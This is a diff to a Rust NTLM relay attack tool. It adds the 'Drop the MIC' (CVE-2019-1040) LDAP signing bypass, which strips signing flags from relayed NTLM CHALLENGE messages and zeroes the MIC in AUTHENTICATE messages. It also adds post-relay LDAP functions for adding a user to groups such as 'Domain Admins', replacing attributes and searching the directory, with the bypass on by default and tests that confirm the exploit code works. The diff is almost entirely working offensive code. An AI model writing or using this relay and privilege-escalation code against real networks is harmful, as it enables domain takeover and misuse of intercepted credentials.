@@ -31,6 +31,17 @@ use tracing::{debug, info, warn};
 
 const NTLM_SIGNATURE: &[u8; 8] = b"NTLMSSP\x00";
 
+// ═══════════════════════════════════════════════════════════
+// NTLM Signing Flags & AvPair Constants ([MS-NLMP])
+// ═══════════════════════════════════════════════════════════
+
+/// NTLMSSP_NEGOTIATE_SIGN — client/server support message signing
+const NTLMSSP_NEGOTIATE_SIGN: u32 = 0x0000_0010;
+/// NTLMSSP_NEGOTIATE_SEAL — client/server support message sealing
+const NTLMSSP_NEGOTIATE_SEAL: u32 = 0x0000_0020;
+/// NTLMSSP_NEGOTIATE_ALWAYS_SIGN — signing is always performed
+const NTLMSSP_NEGOTIATE_ALWAYS_SIGN: u32 = 0x0000_8000;
+
 /// NTLM message types
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum NtlmMessageType {
@@ -70,6 +81,10 @@ pub struct RelayConfig {
     pub remove_on_success: bool,
     /// Connection timeout in seconds
     pub timeout_secs: u64,
+    /// Enable LDAP signing bypass (challenge flag stripping + MIC removal).
+    /// Uses the "Drop the MIC" technique (CVE-2019-1040) to relay NTLM
+    /// authentication to LDAP targets that have signing set to "Negotiate".
+    pub ldap_signing_bypass: bool,
 }
 
 impl Default for RelayConfig {
@@ -80,6 +95,7 @@ impl Default for RelayConfig {
             round_robin: true,
             remove_on_success: true,
             timeout_secs: 30,
+            ldap_signing_bypass: true,
         }
     }
 }
@@ -126,6 +142,98 @@ pub struct RelayedSession {
     pub domain: String,
     pub stream: TcpStream,
     pub smb_session_id: u64,
+    /// LDAP message ID counter (starts at 3 after SASL bind used 1 & 2)
+    ldap_msg_id: u32,
+}
+
+impl RelayedSession {
+    fn next_ldap_id(&mut self) -> u32 {
+        let id = self.ldap_msg_id;
+        self.ldap_msg_id += 1;
+        id
+    }
+
+    /// Add a user DN to a group via LDAP Modify (add member attribute).
+    ///
+    /// Only usable when the relay target is LDAP/LDAPS.
+    pub async fn ldap_add_to_group(&mut self, user_dn: &str, group_dn: &str) -> Result<()> {
+        let msg_id = self.next_ldap_id();
+        let pdu = build_ldap_modify_add_member(group_dn, user_dn, msg_id);
+        self.stream
+            .write_all(&pdu)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP modify write: {}", e)))?;
+
+        let mut buf = vec![0u8; 16384];
+        let len = self
+            .stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP modify read: {}", e)))?;
+
+        let code = parse_ldap_generic_result(&buf[..len], 0x67)?;
+        if code == 0 {
+            info!("✓ LDAP modify success: added {} to {}", user_dn, group_dn);
+            Ok(())
+        } else {
+            Err(RelayError::Protocol(format!("LDAP modify failed — result code {}", code)).into())
+        }
+    }
+
+    /// Perform a base-scope LDAP search (e.g. read an object's attributes).
+    ///
+    /// Returns raw LDAP SearchResultEntry bytes for caller to parse.
+    pub async fn ldap_search(
+        &mut self,
+        base_dn: &str,
+        filter: &str,
+        attrs: &[&str],
+    ) -> Result<Vec<u8>> {
+        let msg_id = self.next_ldap_id();
+        let pdu = build_ldap_search_request(base_dn, filter, attrs, msg_id);
+        self.stream
+            .write_all(&pdu)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP search write: {}", e)))?;
+
+        let mut buf = vec![0u8; 65536];
+        let len = self
+            .stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP search read: {}", e)))?;
+
+        Ok(buf[..len].to_vec())
+    }
+
+    /// Modify an LDAP attribute (replace operation).
+    pub async fn ldap_modify_replace(
+        &mut self,
+        dn: &str,
+        attribute: &str,
+        values: &[&str],
+    ) -> Result<()> {
+        let msg_id = self.next_ldap_id();
+        let pdu = build_ldap_modify_replace(dn, attribute, values, msg_id);
+        self.stream
+            .write_all(&pdu)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP modify write: {}", e)))?;
+
+        let mut buf = vec![0u8; 16384];
+        let len = self
+            .stream
+            .read(&mut buf)
+            .await
+            .map_err(|e| RelayError::Network(format!("LDAP modify read: {}", e)))?;
+
+        let code = parse_ldap_generic_result(&buf[..len], 0x67)?;
+        if code == 0 {
+            Ok(())
+        } else {
+            Err(RelayError::Protocol(format!("LDAP modify-replace failed — code {}", code)).into())
+        }
+    }
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -305,9 +413,21 @@ impl NtlmRelay {
                 Ok((relay_id, challenge))
             }
             Protocol::Ldap | Protocol::Ldaps => {
-                let (stream, challenge) = self
+                let (stream, mut challenge) = self
                     .ldap_negotiate_and_challenge(&target, ntlm_negotiate, timeout)
                     .await?;
+
+                // LDAP signing bypass: strip SIGN/SEAL/ALWAYS_SIGN flags from
+                // the target's CHALLENGE before the victim sees it. This ensures
+                // the victim won't negotiate signing and won't compute a MIC,
+                // so the relayed AUTHENTICATE is accepted without LDAP signing.
+                if self.config.ldap_signing_bypass {
+                    strip_signing_flags_from_challenge(&mut challenge);
+                    debug!(
+                        "LDAP signing bypass: stripped SIGN/SEAL flags from challenge for {}",
+                        target.address
+                    );
+                }
 
                 let relay_id = self.next_id.fetch_add(1, Ordering::Relaxed);
 
@@ -389,8 +509,21 @@ impl NtlmRelay {
                     .await
             }
             Protocol::Ldap | Protocol::Ldaps => {
-                self.ldap_authenticate(&mut pending.stream, ntlm_authenticate)
-                    .await
+                // Apply LDAP signing bypass: strip MIC + SIGN/SEAL flags from
+                // the AUTHENTICATE as a belt-and-suspenders measure alongside
+                // the challenge modification done in Phase 1.
+                if self.config.ldap_signing_bypass {
+                    let patched = prepare_authenticate_for_ldap_relay(ntlm_authenticate);
+                    debug!(
+                        "LDAP signing bypass: patched AUTHENTICATE ({} bytes) for {}",
+                        patched.len(),
+                        pending.target.address
+                    );
+                    self.ldap_authenticate(&mut pending.stream, &patched).await
+                } else {
+                    self.ldap_authenticate(&mut pending.stream, ntlm_authenticate)
+                        .await
+                }
             }
             Protocol::Mssql => {
                 self.mssql_authenticate(&mut pending.stream, ntlm_authenticate)
@@ -423,6 +556,7 @@ impl NtlmRelay {
                     domain,
                     stream: pending.stream,
                     smb_session_id: pending.smb_session_id,
+                    ldap_msg_id: 3,
                 })
             }
             Err(e) => {
@@ -1400,6 +1534,229 @@ fn base64_decode(data: &str) -> Option<Vec<u8>> {
 }
 
 // ═══════════════════════════════════════════════════════════
+// LDAP Signing Bypass — Challenge & Authenticate Modification
+// ═══════════════════════════════════════════════════════════
+
+/// Strip NTLMSSP_NEGOTIATE_SIGN / SEAL / ALWAYS_SIGN from an NTLM
+/// CHALLENGE message **before** the victim sees it.
+///
+/// If the victim never learns the server wants signing, it will not
+/// compute a MIC and will not set SIGN flags in its AUTHENTICATE.
+/// This is the first half of the "Drop the MIC" technique (CVE-2019-1040).
+fn strip_signing_flags_from_challenge(challenge: &mut [u8]) {
+    // NegotiateFlags live at offset 20 in a Type 2 (CHALLENGE) message.
+    if challenge.len() < 24 {
+        return;
+    }
+    if &challenge[0..8] != NTLM_SIGNATURE {
+        return;
+    }
+    let msg_type = u32::from_le_bytes([challenge[8], challenge[9], challenge[10], challenge[11]]);
+    if msg_type != 2 {
+        return;
+    }
+    let mut flags =
+        u32::from_le_bytes([challenge[20], challenge[21], challenge[22], challenge[23]]);
+    flags &= !(NTLMSSP_NEGOTIATE_SIGN | NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_ALWAYS_SIGN);
+    challenge[20..24].copy_from_slice(&flags.to_le_bytes());
+}
+
+/// Prepare an NTLM AUTHENTICATE message for LDAP relay.
+///
+/// Belt-and-suspenders companion to `strip_signing_flags_from_challenge`:
+///   1. Clear SIGN / SEAL / ALWAYS_SIGN from NegotiateFlags (offset 60).
+///   2. Zero the MIC field (16 bytes at offset 72) if it looks present.
+///
+/// The NtProofStr covers `ServerChallenge ‖ ClientBlob` — NOT the outer
+/// AUTHENTICATE header — so flag/MIC changes don't break the hash chain
+/// that the server verifies.
+fn prepare_authenticate_for_ldap_relay(authenticate: &[u8]) -> Vec<u8> {
+    let mut msg = authenticate.to_vec();
+
+    if msg.len() < 64 {
+        return msg;
+    }
+    if &msg[0..8] != NTLM_SIGNATURE {
+        return msg;
+    }
+    let msg_type = u32::from_le_bytes([msg[8], msg[9], msg[10], msg[11]]);
+    if msg_type != 3 {
+        return msg;
+    }
+
+    // Step 1 — clear signing negotiate flags (offset 60..64)
+    let mut flags = u32::from_le_bytes([msg[60], msg[61], msg[62], msg[63]]);
+    flags &= !(NTLMSSP_NEGOTIATE_SIGN | NTLMSSP_NEGOTIATE_SEAL | NTLMSSP_NEGOTIATE_ALWAYS_SIGN);
+    msg[60..64].copy_from_slice(&flags.to_le_bytes());
+
+    // Step 2 — zero the MIC (bytes 72..88).
+    // MIC exists when the message is long enough to contain it (≥88 bytes).
+    // Because we also stripped SIGN from the CHALLENGE the victim saw, the
+    // victim most likely didn't produce a MIC. But zeroing is harmless and
+    // covers edge cases where the victim computed one anyway.
+    if msg.len() >= 88 {
+        msg[72..88].fill(0);
+    }
+
+    msg
+}
+
+// ═══════════════════════════════════════════════════════════
+// Post-Relay LDAP Operation Builders
+// ═══════════════════════════════════════════════════════════
+
+/// Build an LDAP Modify request to add a `member` value to a group.
+///
+/// BER layout:
+/// ```text
+/// SEQUENCE {
+///   INTEGER messageId
+///   APPLICATION 6 (ModifyRequest) {
+///     OCTET STRING groupDN
+///     SEQUENCE OF {
+///       SEQUENCE {
+///         ENUMERATED 0 (add)
+///         PARTIAL-ATTRIBUTE {
+///           OCTET STRING "member"
+///           SET { OCTET STRING userDN }
+///         }
+///       }
+///     }
+///   }
+/// }
+/// ```
+fn build_ldap_modify_add_member(group_dn: &str, user_dn: &str, message_id: u32) -> Vec<u8> {
+    // innermost: SET { OCTET STRING userDN }
+    let val = ber_octet_string(user_dn.as_bytes());
+    let val_set = ber_wrap(0x31, &val);
+    // attribute type + set
+    let attr_type = ber_octet_string(b"member");
+    let partial_attr = [attr_type, val_set].concat();
+    let partial_seq = ber_wrap(0x30, &partial_attr);
+    // operation (ENUMERATED 0 = add)
+    let op = ber_wrap(0x0A, &[0x00]);
+    let mod_item = ber_wrap(0x30, &[op, partial_seq].concat());
+    let mods = ber_wrap(0x30, &mod_item);
+    // ModifyRequest body
+    let object = ber_octet_string(group_dn.as_bytes());
+    let modify_body = [object, mods].concat();
+    let modify_req = ber_wrap(0x66, &modify_body);
+    // top-level LDAP message
+    let msgid = ber_integer(message_id as i64);
+    ber_wrap(0x30, &[msgid, modify_req].concat())
+}
+
+/// Build an LDAP Modify request with a **replace** operation.
+fn build_ldap_modify_replace(
+    dn: &str,
+    attribute: &str,
+    values: &[&str],
+    message_id: u32,
+) -> Vec<u8> {
+    let mut vals = Vec::new();
+    for v in values {
+        vals.extend_from_slice(&ber_octet_string(v.as_bytes()));
+    }
+    let val_set = ber_wrap(0x31, &vals);
+    let attr_type = ber_octet_string(attribute.as_bytes());
+    let partial_attr = [attr_type, val_set].concat();
+    let partial_seq = ber_wrap(0x30, &partial_attr);
+    // ENUMERATED 2 = replace
+    let op = ber_wrap(0x0A, &[0x02]);
+    let mod_item = ber_wrap(0x30, &[op, partial_seq].concat());
+    let mods = ber_wrap(0x30, &mod_item);
+    let object = ber_octet_string(dn.as_bytes());
+    let modify_body = [object, mods].concat();
+    let modify_req = ber_wrap(0x66, &modify_body);
+    let msgid = ber_integer(message_id as i64);
+    ber_wrap(0x30, &[msgid, modify_req].concat())
+}
+
+/// Build a subtree LDAP SearchRequest with a bare `(objectClass=*)` style
+/// filter or a simple equality filter `(attr=value)`.
+fn build_ldap_search_request(
+    base_dn: &str,
+    filter: &str,
+    attrs: &[&str],
+    message_id: u32,
+) -> Vec<u8> {
+    let base = ber_octet_string(base_dn.as_bytes());
+    // scope: wholeSubtree (2)
+    let scope = ber_wrap(0x0A, &[0x02]);
+    // derefAliases: neverDerefAliases (0)
+    let deref = ber_wrap(0x0A, &[0x00]);
+    // sizeLimit 1000
+    let size_limit = ber_integer(1000);
+    // timeLimit 30
+    let time_limit = ber_integer(30);
+    // typesOnly false
+    let types_only = ber_wrap(0x01, &[0x00]);
+
+    // Filter — parse simple (attr=value) or fall back to present(objectClass)
+    let filter_ber = if let Some(inner) = filter.strip_prefix('(').and_then(|s| s.strip_suffix(')'))
+    {
+        if let Some((attr, val)) = inner.split_once('=') {
+            if val == "*" {
+                // present filter: context tag [7] OCTET STRING
+                ber_wrap(0x87, attr.as_bytes())
+            } else {
+                // equality filter: context tag [3] SEQUENCE { attr, val }
+                let a = ber_octet_string(attr.as_bytes());
+                let v = ber_octet_string(val.as_bytes());
+                ber_wrap(0xA3, &[a, v].concat())
+            }
+        } else {
+            ber_wrap(0x87, b"objectClass")
+        }
+    } else {
+        ber_wrap(0x87, b"objectClass")
+    };
+
+    // attributes
+    let mut attr_list = Vec::new();
+    for a in attrs {
+        attr_list.extend_from_slice(&ber_octet_string(a.as_bytes()));
+    }
+    let attr_seq = ber_wrap(0x30, &attr_list);
+
+    let search_body = [
+        base, scope, deref, size_limit, time_limit, types_only, filter_ber, attr_seq,
+    ]
+    .concat();
+    let search_req = ber_wrap(0x63, &search_body);
+    let msgid = ber_integer(message_id as i64);
+    ber_wrap(0x30, &[msgid, search_req].concat())
+}
+
+/// Parse a generic LDAP result (BindResponse, ModifyResponse, etc.)
+/// by scanning for the given APPLICATION tag and extracting the
+/// ENUMERATED resultCode.
+fn parse_ldap_generic_result(data: &[u8], app_tag: u8) -> Result<u8> {
+    for i in 0..data.len().saturating_sub(4) {
+        if data[i] == app_tag {
+            let (inner_start, _inner_len) = match ber_read_length(data, i + 1) {
+                Some(v) => v,
+                None => continue,
+            };
+            if inner_start < data.len() && data[inner_start] == 0x0A {
+                let (val_start, val_len) = match ber_read_length(data, inner_start + 1) {
+                    Some(v) => v,
+                    None => continue,
+                };
+                if val_len > 0 && val_start < data.len() {
+                    return Ok(data[val_start]);
+                }
+            }
+        }
+    }
+    Err(RelayError::Protocol(format!(
+        "Cannot parse LDAP result for tag 0x{:02X}",
+        app_tag
+    ))
+    .into())
+}
+
+// ═══════════════════════════════════════════════════════════
 // Tests
 // ═══════════════════════════════════════════════════════════
 
@@ -1422,6 +1779,7 @@ mod tests {
             round_robin: true,
             remove_on_success: true,
             timeout_secs: 30,
+            ldap_signing_bypass: true,
         };
 
         assert_eq!(config.listen_ip, "0.0.0.0");
@@ -1556,5 +1914,124 @@ mod tests {
         // SSPI data should be at the end
         let end = &pdu[pdu.len() - ntlm.len()..];
         assert_eq!(end, ntlm);
+    }
+
+    // ── LDAP signing bypass tests ────────────────────────
+
+    #[test]
+    fn test_strip_signing_flags_from_challenge() {
+        // Build a minimal Type 2 (CHALLENGE) message with SIGN+SEAL+ALWAYS_SIGN set
+        let mut challenge = Vec::new();
+        challenge.extend_from_slice(b"NTLMSSP\x00"); // signature
+        challenge.extend_from_slice(&2u32.to_le_bytes()); // msg type 2
+        challenge.extend_from_slice(&[0u8; 8]); // target name fields (offset 12..20)
+        // flags at offset 20: SIGN(0x10) | SEAL(0x20) | ALWAYS_SIGN(0x8000) | NTLM(0x200)
+        let flags: u32 = 0x0000_8230;
+        challenge.extend_from_slice(&flags.to_le_bytes());
+        challenge.extend_from_slice(&[0u8; 8]); // server challenge
+
+        strip_signing_flags_from_challenge(&mut challenge);
+
+        let patched =
+            u32::from_le_bytes([challenge[20], challenge[21], challenge[22], challenge[23]]);
+        assert_eq!(
+            patched & NTLMSSP_NEGOTIATE_SIGN,
+            0,
+            "SIGN should be stripped"
+        );
+        assert_eq!(
+            patched & NTLMSSP_NEGOTIATE_SEAL,
+            0,
+            "SEAL should be stripped"
+        );
+        assert_eq!(
+            patched & NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
+            0,
+            "ALWAYS_SIGN should be stripped"
+        );
+        // NTLM flag (0x200) should survive
+        assert_ne!(patched & 0x0200, 0);
+    }
+
+    #[test]
+    fn test_strip_signing_flags_short_message() {
+        let mut short = vec![0u8; 10];
+        // Should not panic on short messages
+        strip_signing_flags_from_challenge(&mut short);
+    }
+
+    #[test]
+    fn test_prepare_authenticate_strips_flags_and_mic() {
+        // Build a minimal Type 3 (AUTHENTICATE) message
+        let mut auth = vec![0u8; 96];
+        auth[0..8].copy_from_slice(b"NTLMSSP\x00");
+        auth[8..12].copy_from_slice(&3u32.to_le_bytes());
+        // flags at offset 60: SIGN | SEAL | ALWAYS_SIGN | NTLM
+        let flags: u32 = NTLMSSP_NEGOTIATE_SIGN
+            | NTLMSSP_NEGOTIATE_SEAL
+            | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            | 0x0200;
+        auth[60..64].copy_from_slice(&flags.to_le_bytes());
+        // Fake MIC at bytes 72..88
+        auth[72..88].fill(0xAA);
+
+        let patched = prepare_authenticate_for_ldap_relay(&auth);
+
+        let new_flags = u32::from_le_bytes([patched[60], patched[61], patched[62], patched[63]]);
+        assert_eq!(new_flags & NTLMSSP_NEGOTIATE_SIGN, 0);
+        assert_eq!(new_flags & NTLMSSP_NEGOTIATE_SEAL, 0);
+        assert_eq!(new_flags & NTLMSSP_NEGOTIATE_ALWAYS_SIGN, 0);
+        assert_ne!(new_flags & 0x0200, 0, "NTLM flag must survive");
+
+        // MIC should be zeroed
+        assert!(
+            patched[72..88].iter().all(|&b| b == 0),
+            "MIC must be zeroed"
+        );
+    }
+
+    #[test]
+    fn test_prepare_authenticate_short_message() {
+        let short = b"NTLMSSP\x00\x03\x00\x00\x00".to_vec();
+        // Should return as-is without panicking (< 64 bytes)
+        let result = prepare_authenticate_for_ldap_relay(&short);
+        assert_eq!(result.len(), short.len());
+    }
+
+    #[test]
+    fn test_ldap_modify_add_member_valid_ber() {
+        let pdu = build_ldap_modify_add_member(
+            "CN=Domain Admins,CN=Users,DC=lab,DC=local",
+            "CN=testuser,CN=Users,DC=lab,DC=local",
+            3,
+        );
+        // Must start with SEQUENCE
+        assert_eq!(pdu[0], 0x30);
+        // Must contain "member"
+        assert!(pdu.windows(6).any(|w| w == b"member"));
+        // Must contain both DNs
+        assert!(pdu.windows(12).any(|w| w == b"Domain Admin"));
+    }
+
+    #[test]
+    fn test_ldap_search_request_valid_ber() {
+        let pdu = build_ldap_search_request(
+            "DC=lab,DC=local",
+            "(objectClass=*)",
+            &["dn", "sAMAccountName"],
+            4,
+        );
+        assert_eq!(pdu[0], 0x30);
+        // Must contain base DN
+        assert!(pdu.windows(3).any(|w| w == b"lab"));
+    }
+
+    #[test]
+    fn test_relay_config_ldap_bypass_default() {
+        let cfg = RelayConfig::default();
+        assert!(
+            cfg.ldap_signing_bypass,
+            "LDAP signing bypass should default to true"
+        );
     }
 }
